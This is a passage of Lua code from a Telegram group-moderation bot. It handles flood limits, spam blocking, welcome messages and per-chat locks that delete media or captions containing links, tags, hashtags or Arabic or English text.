if hxousedx1:get(HXOUSE.."video_repall"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, hxousedx1:get(HXOUSE.."video_repall"..msg.content_.text_))
end
if hxousedx1:get(HXOUSE.."voice_repall"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, hxousedx1:get(HXOUSE.."voice_repall"..msg.content_.text_))
end
if  hxousedx1:get(HXOUSE.."gif_repall"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, hxousedx1:get(HXOUSE.."gif_repall"..msg.content_.text_))
end
if hxousedx1:get(HXOUSE.."stecker_repall"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, hxousedx1:get(HXOUSE.."stecker_repall"..msg.content_.text_))
end
if hxousedx1:get(HXOUSE.."text_repall"..msg.content_.text_) then
hxousedx(msg.chat_id_, msg.id_, 1, hxousedx1:get(HXOUSE.."text_repall"..msg.content_.text_) ,  1, "md")
end
end 
-- end functions hxouse --
----------------------------------------Anti FLood---------------------------------------------
--------------Flood Max --------------hxouse
local flmax = 'flood:max:'..msg.chat_id_
if not hxousedx1:get(HXOUSE..flmax) then
floodMax = 5
else
floodMax = tonumber(hxousedx1:get(HXOUSE..flmax))
end
-----------------End-------------------
-----------------Msg-------------------hxouse
local pm = 'flood:'..msg.sender_user_id_..':'..msg.chat_id_..':msgs'
if not hxousedx1:get(HXOUSE..pm) then
msgs = 0
else
msgs = tonumber(hxousedx1:get(HXOUSE..pm))
end
-----------------End-------------------
------------Flood Check Time-----------
local TIME_CHECK = 2
-----------------End-------------------
-------------Flood Check---------------hxouse
local hashflood = 'anti-flood:'..msg.chat_id_
if msgs > (floodMax - 1) then
if hxousedx1:get(HXOUSE..'floodstatus'..msg.chat_id_) == 'Kicked' then
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
chat_kick(msg.chat_id_, msg.sender_user_id_)
local hxouse = '⌯︙ الدوده ('..msg.sender_user_id_..') \n⌯︙ قام بالتكرار المحدد تم طرده  '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 12, string.len(msg.sender_user_id_))
elseif hxousedx1:get(HXOUSE..'floodstatus'..msg.chat_id_) == 'DelMsg' then
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
else
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
end
end
-----------------End-------------------
local sendhxouse = function(chat_id, reply_to_message_id, text, offset, length, userid)
tdcli_function({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = 1,
clear_draft_ = 0,
entities_ = {
[0] = {
ID = "MessageEntityMentionName",
offset_ = offset,
length_ = length,
user_id_ = userid
}
}
}
}, dl_cb, nil)
end
--------------ANTI ATTACK-------------hxouse
local pmonpv = 'antiattack:'..msg.sender_user_id_..':'..msg.chat_id_..':msgs'
if not hxousedx1:get(HXOUSE..pmonpv) then
msgsonpv = 0
else
msgsonpv = tonumber(hxousedx1:get(HXOUSE..pmonpv))
end
if msgsonpv > (13 - 1) then
blockUser(msg.sender_user_id_)
end
local idmem = tostring(msg.chat_id_)
if idmem:match("^(%d+)") then
hxousedx1:setex(HXOUSE..pmonpv, TIME_CHECK, msgsonpv+1)
end
local Time = os.date("%X")
if Time == "01:34" then
hxousedx(msg.chat_id_, msg.id_, 1, 'هلو الساعه ب 1:34', 1, 'md')
print('الكود')
end
-------------------------------------- Process mod --------------------------------------------
local check_username = function(extra, result, success)
local fname = result.first_name_ or ""
local lname = result.last_name_ or ""
local name = fname .. " " .. lname
local username = result.username_
local svuser = "user:Name" .. result.id_
local id = result.id_
if username then
hxousedx1:set(HXOUSE..svuser, "@" .. username)
else
hxousedx1:set(HXOUSE..svuser, name)
end
end
getUser(msg.sender_user_id_, check_username)
-----------------------------******** START MSG CHECKS HXOUSE ********----------------------------------------
-----------------------------------HXOUSE TEAM--------------------------------------------------------------------
if is_banned(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
chat_kick(msg.chat_id_, msg.sender_user_id_)
return
end
if is_muted(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
return
end
if is_gbanned(msg.sender_user_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
chat_kick(msg.chat_id_, msg.sender_user_id_)
delete_msg(chat,msgs)
return
end
if hxousedx1:get(HXOUSE..'bot:muteall'..msg.chat_id_) and not is_momod(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
return
end 
hxousedx1:incr(HXOUSE..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
hxousedx1:incr(HXOUSE..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
hxousedx1:incr(HXOUSE..'group:msgs'..msg.chat_id_)
if msg.content_.ID == "MessagePinMessage" then
if hxousedx1:get(HXOUSE..'pinnedmsg'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:pin:mute'..msg.chat_id_) then
unpinmsg(msg.chat_id_)
local pin_id = hxousedx1:get(HXOUSE..'pinnedmsg'..msg.chat_id_)
pinmsg(msg.chat_id_,pin_id,0)
end
end
if hxousedx1:get(HXOUSE..'bot:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
end
hxousedx1:del(HXOUSE..'bot:viewget'..msg.sender_user_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ The more hits you : '..msg.views_..' seen ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ مشاهدات المنشور  '..msg.views_..' تقريبا ', 1, 'md')
end
hxousedx1:del(HXOUSE..'bot:viewget'..msg.sender_user_id_)
end
end
--Photo
--Photo
------- --- Photo--------- hxouse
-- -----------------Photo
--Photo
--Photo
if msg_type == 'MSG:Photo' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'anti-flood:'..msg.chat_id_) then
hxousedx1:setex(HXOUSE..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if hxousedx1:get(HXOUSE..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Photo]")
end
end
end
if hxousedx1:get(HXOUSE..'bot:photo:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Photo]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if hxousedx1:get(HXOUSE..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Photo]")
if hxousedx1:get(HXOUSE..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end
end
end
if hxousedx1:get(HXOUSE..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Photo]")
end
end
if msg.content_.caption_:match("#") then
if hxousedx1:get(HXOUSE..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Photo]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if hxousedx1:get(HXOUSE..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Photo]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if hxousedx1:get(HXOUSE..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Photo]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if hxousedx1:get(HXOUSE..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Photo]")
end
end
end
end
--Markdown
--Markdown
------- --- Markdown---------faedee
-- -----------------Markdown
--Markdown
--Markdown
elseif msg_type == 'MSG:MarkDown' then
if hxousedx1:get(HXOUSE..'markdown:lock'..msg.chat_id_) then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
end
--Document
--Document
------- --- Document--------- hxouse
-- -----------------Document
--Document
--Document
elseif msg_type == 'MSG:Document' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'anti-flood:'..msg.chat_id_) then
hxousedx1:setex(HXOUSE..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if hxousedx1:get(HXOUSE..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Document]")
end
end
end
if hxousedx1:get(HXOUSE..'bot:document:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Document]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if hxousedx1:get(HXOUSE..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Document]")
if hxousedx1:get(HXOUSE..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end
end
end
if hxousedx1:get(HXOUSE..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Document]")
end
end
if msg.content_.caption_:match("#") then
if hxousedx1:get(HXOUSE..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Document]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if hxousedx1:get(HXOUSE..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Document]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if hxousedx1:get(HXOUSE..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Document]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if hxousedx1:get(HXOUSE..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Document]")
end
end
end
end
--Inline
--Inline
------- --- Inline---------hxouse
-- -----------------Inline
--Inline
--Inline
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'anti-flood:'..msg.chat_id_) then
hxousedx1:setex(HXOUSE..pm, TIME_CHECK, msgs+1)
end
if hxousedx1:get(HXOUSE..'bot:inline:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Inline]")
end
end
--Sticker
--Sticker
------- --- Sticker---------hxouse
-- -----------------Sticker
--Sticker
--Sticker
elseif msg_type == 'MSG:Sticker' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'anti-flood:'..msg.chat_id_) then
hxousedx1:setex(HXOUSE..pm, TIME_CHECK, msgs+1)
end
if hxousedx1:get(HXOUSE..'bot:sticker:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Sticker]")
end
end
elseif msg_type == 'MSG:JoinByLink' then
if hxousedx1:get(HXOUSE..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_ 
 delete_msg(chat,msgs)
print("Deleted [Lock] [Tgservice] [JoinByLink]")
return
end
function get_welcome(extra,result,success)
if hxousedx1:get(HXOUSE..'welcome:'..msg.chat_id_) then
text = hxousedx1:get(HXOUSE..'welcome:'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
text = 'Hi {firstname} Welcome To Group '
else
text = '⌯︙ اهلا بك عزيزي   {firstname}\n⌯︙ معرفك @{username} \n⌯︙ التزم بالقوانين لتجنب الطرد '
end
end
local text = text:gsub('{firstname}',(result.first_name_ or ''))
local text = text:gsub('{lastname}',(result.last_name_ or ''))
local text = text:gsub('{username}',(result.username_ or ''))
hxousedx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
if hxousedx1:get(HXOUSE.."bot:welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--New User Add
--New User Add
------- --- New User Add---------hxouse
-- -----------------New User Add
--New User Add
--New User Add
elseif msg_type == 'MSG:NewUserAdd' then
if hxousedx1:get(HXOUSE..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tgservice] [NewUserAdd]")
return
end
if msg.content_.members_[0].username_ and msg.content_.members_[0].username_:match("[Bb][Oo][Tt]$") then
if not is_momod(msg.content_.members_[0].id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'bot:bots:gkgk'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
return false
end
end
end
if is_banned(msg.content_.members_[0].id_, msg.chat_id_) then
chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
return false
end
if hxousedx1:get(HXOUSE.."bot:welcome"..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'welcome:'..msg.chat_id_) then
text = hxousedx1:get(HXOUSE..'welcome:'..msg.chat_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
text = 'Hi Welcome To Group'
else
text = '⌯︙ اهلا بك عزيزي   {firstname}\n⌯︙ معرفك @{username} \n⌯︙ التزم بالقوانين لتجنب الطرد '
end
end
local text = text:gsub('{firstname}',(msg.content_.members_[0].first_name_ or ''))
local text = text:gsub('{lastname}',(msg.content_.members_[0].last_name_ or ''))
local text = text:gsub('{username}',('@'..msg.content_.members_[0].username_ or ''))
hxousedx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--Contact
--Contact
------- --- Contact---------hxouse
-- -----------------Contact
--Contact
--Contact
elseif msg_type == 'MSG:Contact' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'anti-flood:'..msg.chat_id_) then
hxousedx1:setex(HXOUSE..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if hxousedx1:get(HXOUSE..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Contact]")
end
end
end
if hxousedx1:get(HXOUSE..'bot:contact:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Contact]")
end
end
--Audio
--Audio
------- --- Audio---------hxouse
-- -----------------Audio
--Audio
--Audio
elseif msg_type == 'MSG:Audio' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'anti-flood:'..msg.chat_id_) then
hxousedx1:setex(HXOUSE..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if hxousedx1:get(HXOUSE..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Audio]")
end
end
end
if hxousedx1:get(HXOUSE..'bot:music:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Audio]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if hxousedx1:get(HXOUSE..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Audio]")
end
end
if hxousedx1:get(HXOUSE..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Audio]")
end
end
if msg.content_.caption_:match("#") then
if hxousedx1:get(HXOUSE..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Audio]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if hxousedx1:get(HXOUSE..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Audio]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if hxousedx1:get(HXOUSE..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Voice]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if hxousedx1:get(HXOUSE..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Audio]")
end
end
end
end
--Voice
--Voice
------- --- Voice---------faedee
-- -----------------Voice
--Voice
--Voice
elseif msg_type == 'MSG:Voice' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'anti-flood:'..msg.chat_id_) then
hxousedx1:setex(HXOUSE..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if hxousedx1:get(HXOUSE..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Voice]")
end
end
end
if hxousedx1:get(HXOUSE..'bot:voice:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Voice]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if hxousedx1:get(HXOUSE..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Voice]")
end
end
if hxousedx1:get(HXOUSE..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Voice]")
end
end
if msg.content_.caption_:match("#") then
if hxousedx1:get(HXOUSE..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Voice]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if hxousedx1:get(HXOUSE..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Voice]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if hxousedx1:get(HXOUSE..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Voice]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if hxousedx1:get(HXOUSE..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Voice]")
end
end
end
end
--Location
--Location
------- --- Location---------hxouse
-- -----------------Location
--Location
--Location
elseif msg_type == 'MSG:Location' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'anti-flood:'..msg.chat_id_) then
hxousedx1:setex(HXOUSE..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if hxousedx1:get(HXOUSE..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Location]")
end
end
end
if hxousedx1:get(HXOUSE..'bot:location:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Location]")
return
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if hxousedx1:get(HXOUSE..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Location]")
end
end
if hxousedx1:get(HXOUSE..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Location]")
end
end
if msg.content_.caption_:match("#") then
if hxousedx1:get(HXOUSE..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Location]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if hxousedx1:get(HXOUSE..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Location]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if hxousedx1:get(HXOUSE..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Location]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if hxousedx1:get(HXOUSE..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Location]")
end
end
end
end
--Video
--Video
------- --- Video---------hxouse
-- -----------------Video
--Video
--Video
elseif msg_type == 'MSG:Video' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'anti-flood:'..msg.chat_id_) then
hxousedx1:setex(HXOUSE..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if hxousedx1:get(HXOUSE..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Video]")
end
end
end
if hxousedx1:get(HXOUSE..'bot:video:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Video]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if hxousedx1:get(HXOUSE..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
